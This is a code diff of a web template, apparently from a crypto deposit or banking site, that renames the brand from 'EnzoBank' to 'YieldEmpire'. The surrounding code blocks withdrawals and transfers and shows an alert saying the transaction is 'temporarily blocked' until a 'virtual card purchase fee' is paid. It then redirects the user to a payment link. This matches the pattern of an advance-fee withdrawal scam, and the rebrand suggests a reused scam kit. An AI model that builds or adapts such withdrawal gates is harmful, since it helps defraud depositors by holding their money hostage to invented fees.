@@ -63,7 +63,7 @@ $coins = config("crypto_deposit.coins", []);
             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
             <div>
                 <strong>Virtual Card Required</strong><br>
-                A virtual card purchase of ${{ number_format($cardFee, 2) }} is required before you can withdraw or send money out of your EnzoBank account.
+                A virtual card purchase of ${{ number_format($cardFee, 2) }} is required before you can withdraw or send money out of your YieldEmpire account.
                 <a href="{{ $virtualCardUrl }}" class="mo-submit-btn" style="display:inline-block;width:auto;padding:8px 18px;font-size:13px;margin-top:8px;text-decoration:none;">Get Virtual Card for ${{ number_format($cardFee, 2) }}</a>
             </div>
         </div>
@@ -230,7 +230,7 @@ document.addEventListener("DOMContentLoaded", function() {
     function gateVirtualCard(e) {
         if (!window.__hasVirtualCard) {
             e.preventDefault();
-            alert("Your transaction has been temporarily blocked.\n\nTo continue, you must pay the virtual card purchase fee of $" + window.__cardFee.toFixed(2) + " USD.\n\nYour virtual card unlocks withdrawals from your EnzoBank account.");
+            alert("Your transaction has been temporarily blocked.\n\nTo continue, you must pay the virtual card purchase fee of $" + window.__cardFee.toFixed(2) + " USD.\n\nYour virtual card unlocks withdrawals from your YieldEmpire account.");
             window.location = window.__virtualCardUrl;
             return false;
         }
